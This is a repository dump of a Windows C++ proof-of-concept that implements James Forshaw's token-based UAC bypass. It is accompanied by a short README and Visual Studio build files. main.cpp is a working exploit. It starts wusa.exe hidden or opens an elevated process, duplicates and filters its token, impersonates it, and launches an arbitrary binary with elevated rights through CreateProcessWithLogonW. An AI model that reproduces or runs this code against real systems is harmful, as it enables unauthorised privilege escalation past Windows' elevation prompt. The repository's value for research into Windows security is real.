@@ -1,0 +1,593 @@
+Project Path: arc_gmh5225_UAC_1g3bgd6w
+
+Source Tree:
+
+```txt
+arc_gmh5225_UAC_1g3bgd6w
+├── README.md
+└── uac
+    ├── uac
+    │   ├── main.cpp
+    │   ├── uac.vcxproj
+    │   └── uac.vcxproj.filters
+    └── uac.sln
+
+```
+
+`README.md`:
+
+```md
+# uac
+PoC - UAC bypass technique by James Forshaw
+
+* https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
+* https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
+* https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
+
+#### Credits
+
+Reference implementation code: 
+* https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/tyranid.c
+
+```
+
+`uac/uac.sln`:
+
+```sln
+
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio 14
+VisualStudioVersion = 14.0.25420.1
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "uac", "uac\uac.vcxproj", "{E721F547-A5EB-4EBD-94F5-4F992F547524}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|x64 = Debug|x64
+		Debug|x86 = Debug|x86
+		Release|x64 = Release|x64
+		Release|x86 = Release|x86
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Debug|x64.ActiveCfg = Debug|x64
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Debug|x64.Build.0 = Debug|x64
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Debug|x86.ActiveCfg = Debug|Win32
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Debug|x86.Build.0 = Debug|Win32
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Release|x64.ActiveCfg = Release|x64
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Release|x64.Build.0 = Release|x64
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Release|x86.ActiveCfg = Release|Win32
+		{E721F547-A5EB-4EBD-94F5-4F992F547524}.Release|x86.Build.0 = Release|Win32
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+EndGlobal
+
+```
+
+`uac/uac/main.cpp`:
+
+```cpp
+/*
+ * PoC - UAC bypass technique by James Forshaw
+ * https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
+ * https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
+ * https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
+ * Credits - reference implementation code: 
+ * https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/tyranid.c
+ */
+#include <Windows.h>
+#include <stdio.h>
+#include <tchar.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+#ifndef InitializeObjectAttributes
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
+    (p)->RootDirectory = r;                             \
+    (p)->Attributes = a;                                \
+    (p)->ObjectName = n;                                \
+    (p)->SecurityDescriptor = s;                        \
+    (p)->SecurityQualityOfService = NULL;               \
+    }
+#endif
+
+#ifndef STATUS_UNSUCCESSFUL
+#define STATUS_UNSUCCESSFUL 0xC0000001
+#endif
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING;
+
+typedef UNICODE_STRING *PUNICODE_STRING;
+typedef const UNICODE_STRING *PCUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG Length;
+	HANDLE RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG Attributes;
+	PVOID SecurityDescriptor;
+	PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES;
+typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
+
+typedef enum _THREADINFOCLASS {
+	ThreadBasicInformation,
+	ThreadTimes,
+	ThreadPriority,
+	ThreadBasePriority,
+	ThreadAffinityMask,
+	ThreadImpersonationToken,
+	ThreadDescriptorTableEntry,
+	ThreadEnableAlignmentFaultFixup,
+	ThreadEventPair,
+	ThreadQuerySetWin32StartAddress,
+	ThreadZeroTlsCell,
+	ThreadPerformanceCount,
+	ThreadAmILastThread,
+	ThreadIdealProcessor,
+	ThreadPriorityBoost,
+	ThreadSetTlsArrayAddress,
+	ThreadIsIoPending,
+	ThreadHideFromDebugger,
+	ThreadBreakOnTermination,
+	ThreadSwitchLegacyState,
+	ThreadIsTerminated,
+	ThreadLastSystemCall,
+	ThreadIoPriority,
+	ThreadCycleTime,
+	ThreadPagePriority,
+	ThreadActualBasePriority,
+	ThreadTebInformation,
+	ThreadCSwitchMon,
+	ThreadCSwitchPmu,
+	ThreadWow64Context,
+	ThreadGroupInformation,
+	ThreadUmsInformation,
+	ThreadCounterProfiling,
+	ThreadIdealProcessorEx,
+	ThreadCpuAccountingInformation,
+	ThreadSuspendCount,
+	ThreadHeterogeneousCpuPolicy,
+	ThreadContainerId,
+	ThreadNameInformation,
+	ThreadProperty,
+	ThreadSelectedCpuSets,
+	ThreadSystemThreadInformation,
+	MaxThreadInfoClass
+} THREADINFOCLASS;
+
+extern "C" NTSTATUS NTAPI NtSetInformationToken(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);
+extern "C" NTSTATUS NTAPI NtFilterToken(HANDLE, ULONG, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_GROUPS, PHANDLE);
+extern "C" NTSTATUS NTAPI NtDuplicateToken(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
+extern "C" NTSTATUS NTAPI NtSetInformationThread(HANDLE, THREADINFOCLASS, PVOID, ULONG);
+extern "C" NTSTATUS NTAPI RtlAllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY, UCHAR, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, PSID);
+extern "C" ULONG NTAPI RtlLengthSid(PSID);
+extern "C" ULONG NTAPI RtlNtStatusToDosError(NTSTATUS);
+
+BOOL isElevated(HANDLE hProcess) 
+{
+	BOOL fReturn = FALSE;
+	HANDLE hToken = NULL;
+	
+	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) 
+	{
+		TOKEN_ELEVATION Elevation;
+		DWORD dwSize = sizeof(TOKEN_ELEVATION);
+
+		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize)) 
+			fReturn = Elevation.TokenIsElevated;
+	}
+	if (hToken)
+		CloseHandle(hToken);
+
+	return fReturn;
+}
+
+VOID displayHelp()
+{
+	wprintf(TEXT("Usage: uac [-p <pid>] <binary to run>\n\n"));
+	wprintf(L"Options:\n");
+	wprintf(L"  -p <pid>\t\t\tProcess ID of an elevated process\n");
+}
+
+DWORD wmain(DWORD argc, wchar_t* argv[])
+{
+	DWORD dwProcessId = 0;
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFO si = { 0 };
+	SHELLEXECUTEINFO ShExecInfo = { 0 };
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	HANDLE hProcess;
+	wchar_t *EXE_NAME = TEXT("wusa.exe");
+	wchar_t *strBinName;
+	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
+
+	if (argc != 2 && argc != 4)
+	{
+		displayHelp();
+		return 0;
+	}
+
+	if (_wcsicmp(argv[1], TEXT("-p")) == 0)
+	{
+		dwProcessId = _wtoi(argv[2]);
+		strBinName = (wchar_t *)malloc((wcslen(argv[3]) + 1) * sizeof(wchar_t));
+		strBinName = argv[3];
+	}
+	else
+	{
+		strBinName = (wchar_t *)malloc((wcslen(argv[1]) + 1) * sizeof(wchar_t));
+		strBinName = argv[1];
+	}
+
+	// USE AUTOELEVATED PROCESS
+	if (dwProcessId)
+	{
+		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
+		if (hProcess == NULL)
+		{
+			wprintf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
+			return 1;
+		}
+
+		if (isElevated(hProcess))
+			wprintf(TEXT("[+] Process is elevated. Continuing...\n"));
+		else
+		{
+			wprintf(TEXT("[-] Process is not elevated. Aborting.\n"));
+			goto cleanup;
+		}
+	}
+	else
+	{
+		// RUN AUTOELEVATED APP (WUSA.EXE)
+		ShExecInfo.cbSize = sizeof(ShExecInfo);
+		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+		ShExecInfo.lpFile = EXE_NAME;
+		ShExecInfo.nShow = SW_HIDE;
+	
+		if (!ShellExecuteEx(&ShExecInfo))
+		{
+#ifdef _DEBUG
+			wprintf(TEXT("[-] Failed to start wusa.exe\n"));
+#endif
+			return 1;
+		}
+
+		hProcess = ShExecInfo.hProcess;
+	}
+
+	// OPEN ELEVATED PROCESS TOKEN
+	HANDLE hToken = NULL;
+	Status = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken);
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] OpenProcessToken failed\n"));
+#endif		
+		goto cleanup;
+	}
+
+	// WE DONT NEED WUSA.EXE ANYMORE
+	if(!dwProcessId)
+		TerminateProcess(hProcess, 0);
+
+	// DUPLICATE PRIMARY TOKEN
+	SECURITY_QUALITY_OF_SERVICE sqos;
+	OBJECT_ATTRIBUTES obja;
+	sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
+	sqos.ImpersonationLevel = SecurityImpersonation;
+	sqos.ContextTrackingMode = 0;
+	sqos.EffectiveOnly = FALSE;
+	InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+	obja.SecurityQualityOfService = &sqos;
+	HANDLE hNewToken = NULL;
+
+	Status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hNewToken);
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] NtDuplicateToken failed\n"));
+#endif
+		CloseHandle(hNewToken);
+		goto cleanup;
+	}
+	
+	// INITIALIZE SID
+	PSID pSID = NULL;
+	Status = RtlAllocateAndInitializeSid(&ntAuthority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pSID);
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] RtlAllocateAndInitializeSid failed\n"));
+#endif
+		goto cleanup;
+	}
+
+	// LOWER DUPLICATED TOKEN IL FROM HIGH TO MEDIUM
+	TOKEN_MANDATORY_LABEL tml;
+	tml.Label.Attributes = SE_GROUP_INTEGRITY;
+	tml.Label.Sid = pSID;
+
+	Status = NtSetInformationToken(hNewToken, TokenIntegrityLevel, &tml, (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pSID)));
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] NtSetInformationToken failed\n"));
+#endif
+		goto cleanup;
+	}
+
+	// CREATE RESTRICTED TOKEN
+	HANDLE LUAToken = NULL;	
+	Status = NtFilterToken(hNewToken, LUA_TOKEN, NULL, NULL, NULL, &LUAToken);
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] NtFilterToken failed\n"));
+#endif
+		CloseHandle(LUAToken);
+		goto cleanup;
+	}
+
+	// IMPERSONATE LOGGED ON USER
+	// DUPLICATE RESTRICTED TOKEN
+	Status = NtDuplicateToken(LUAToken, TOKEN_IMPERSONATE | TOKEN_QUERY, &obja, FALSE, TokenImpersonation, &hNewToken);
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] NtDuplicateToken failed\n"));
+#endif
+		goto cleanup;
+	}
+
+	Status = NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hNewToken, sizeof(HANDLE));
+	if (!NT_SUCCESS(Status))
+	{
+#ifdef _DEBUG
+		wprintf(TEXT("[-] NtSetInformationThread failed\n"));
+#endif
+		goto cleanup;
+	}
+
+	BOOL bResult = CreateProcessWithLogonW(TEXT("pwn"), TEXT("pwn"), TEXT("pwn"), LOGON_NETCREDENTIALS_ONLY, strBinName, NULL, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
+
+	if (bResult) {
+		if (pi.hThread) 
+			CloseHandle(pi.hThread);
+		if (pi.hProcess) 
+			CloseHandle(pi.hProcess);
+	}
+	else
+	{
+#ifdef _DEBUG
+		wprintf(L"[-] CreateProcessWithLogonW failed!\n");
+#endif	
+		goto cleanup;
+	}
+
+	return 0;
+
+cleanup:
+	if(hProcess)
+		CloseHandle(hProcess);
+	if(hToken)
+		CloseHandle(hToken);
+	return RtlNtStatusToDosError(Status);
+}
+
+```
+
+`uac/uac/uac.vcxproj`:
+
+```vcxproj
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{E721F547-A5EB-4EBD-94F5-4F992F547524}</ProjectGuid>
+    <Keyword>Win32Proj</Keyword>
+    <RootNamespace>uac</RootNamespace>
+    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v140</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v140</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v140</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v140</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PostBuildEvent>
+      <Command>copy ..\Debug\uac.exe ..\bin\uac.exe</Command>
+    </PostBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PostBuildEvent>
+      <Command>copy ..\x64\Debug\uac.exe ..\bin\uac.exe</Command>
+    </PostBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PostBuildEvent>
+      <Command>copy ..\Release\uac.exe ..\bin\uac.exe</Command>
+    </PostBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PostBuildEvent>
+      <Command>copy ..\x64\Release\uac.exe ..\bin\uac.exe</Command>
+    </PostBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
+```
+
+`uac/uac/uac.vcxproj.filters`:
+
+```filters
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+</Project>
+```
